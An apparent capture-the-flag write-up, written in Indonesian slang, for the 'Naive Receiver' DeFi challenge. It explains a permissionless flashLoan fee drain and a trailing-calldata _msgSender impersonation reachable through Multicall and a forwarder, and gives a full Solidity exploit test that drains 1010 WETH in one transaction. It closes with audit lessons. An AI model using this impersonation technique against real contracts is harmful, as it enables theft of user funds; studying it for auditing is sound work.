# Naive Receiver

## 1. Bug

Ada 2 bug yg dikombinasi:

**Bug A — flashLoan bisa dipanggil siapa aja.**
Function `flashLoan` di pool nggak ngecek siapa yg manggil. Siapapun bisa manggil `flashLoan(receiver, 0, weth, "")` — dan receiver otomatis bayar fee 1 WETH tiap panggilan. Fixed fee, nggak peduli pinjem berapa (bahkan pinjem 0 tetep bayar).

**Bug B — withdraw baca 20 karakter terakhir buat tau siapa yg minta.**
Function `withdraw` percaya identitas pemanggil dari 20 karakter terakhir calldata. Kalo lu bisa taro alamat orang lain di ekor calldata, function ngira orang itu yg minta withdraw.

## 2. Where

- `src/naive-receiver/NaiveReceiverPool.sol` — function `flashLoan` (bug A), function `_msgSender` (bug B)
- `src/naive-receiver/Multicall.sol` — kepake buat gabungin 11 call jadi 1 tx
- `src/naive-receiver/BasicForwarder.sol` — kepake buat kirim call atas nama player

## 3. Leaks reason

### Bug A — flashLoan permissionless

```solidity
function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
    external
    returns (bool)
{
    // nggak ada cek msg.sender == receiver owner
    // nggak ada cek receiver setuju dipinjemin
    ...
    deposits[feeReceiver] += FIXED_FEE;  // fee masuk saldo deployer
}
```

Assumsi developer: "yg manggil flashLoan pasti owner receiver, ngapain orang lain manggil?" Assumsi ini salah. Attacker bisa manggil buat maksa receiver bayar fee walaupun receiver nggak minta pinjeman.

### Bug B — _msgSender trust ekor calldata

```solidity
function _msgSender() internal view override returns (address) {
    if (msg.sender == trustedForwarder && msg.data.length >= 20) {
        return address(bytes20(msg.data[msg.data.length - 20:]));
    } else {
        return super._msgSender();
    }
}
```

Pool percaya: kalo yg manggil = forwarder, artinya ini call lewat perantara, jadi identitas asli ada di 20 karakter terakhir.

Assumsi-nya: "cuma forwarder yg nempel 20 karakter itu, jadi pasti bener."

Assumsi ini bocor pas multicall masuk. Multicall bikin 1 call jadi banyak sub-call via delegatecall. Isi sub-call = lu yg susun. Lu bisa taro alamat siapapun di ekor sub-call.

## 4. How we breach it

Total drain = 1000 (pool) + 10 (receiver) = 1010 WETH ke recovery.

Constraint: max 2 tx dari player.

Strategi: bungkus 11 call jadi 1 tx pake multicall + forwarder.

- 10 call `flashLoan(receiver, 0)` → kuras 10 WETH receiver ke saldo deployer (via fee)
- 1 call `withdraw(1010, recovery)` + ekor = deployer → drain saldo deployer ke recovery

```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    bytes[] memory callDatas = new bytes[](11);

    // 10x flashLoan spam — kuras receiver via fee
    for (uint256 i = 0; i < 10; i++) {
        callDatas[i] = abi.encodeCall(
            NaiveReceiverPool.flashLoan,
            (receiver, address(weth), 0, "")
        );
    }

    // withdraw dengan ekor calldata = deployer
    callDatas[10] = abi.encodePacked(
        abi.encodeCall(
            NaiveReceiverPool.withdraw,
            (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
        ),
        bytes32(uint256(uint160(deployer)))
    );

    // bungkus 11 call jadi 1 payload multicall
    bytes memory multicallData = abi.encodeCall(pool.multicall, (callDatas));

    // isi request buat forwarder
    BasicForwarder.Request memory request = BasicForwarder.Request({
        from: player,
        target: address(pool),
        value: 0,
        gas: gasleft(),
        nonce: forwarder.nonces(player),
        data: multicallData,
        deadline: block.timestamp + 1 hours
    });

    // sign pake playerPk
    bytes memory signature;
    {
        bytes32 requestHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        signature = abi.encodePacked(r, s, v);
    }

    // eksekusi lewat forwarder — semua muat 1 tx
    forwarder.execute(request, signature);
}
```

## 5. Related shit / bonus

**Real-world reference:**
Bug ini pernah kejadian di production. OpenZeppelin's `ERC2771Context` + `Multicall` punya vuln persis kayak gini — disclosed Desember 2023. Kontrak yg pake dua library ini bareng bisa jadi target impersonation.

**Kenapa lolos review:**
Dua pattern individually aman:
- `ERC2771Context` (buat gasless tx / meta-tx) — aman kalo cuma dia
- `Multicall` (buat batching) — aman kalo cuma dia

Baru bocor pas dikombinasi. Reviewer yg audit per-file nggak bakal nangkep. Butuh liat interaksi antar file.

**Red flag pattern buat next audit:**
Tiap kali liat kontrak inherit `Multicall` + override `_msgSender` (atau pake `ERC2771Context`), cek:
- Bisa nggak attacker taro data arbitrary di sub-call calldata?
- Kalo iya, impersonation possible.

**Lesson:**
Kombinasi 2 pattern yg masing-masing aman bisa jadi vuln. Access control yg longgar ("siapa aja bisa manggil") sering aman sampai dikombinasi sama function lain yg forward identity. Meta-tx / forwarder pattern = red flag zone.
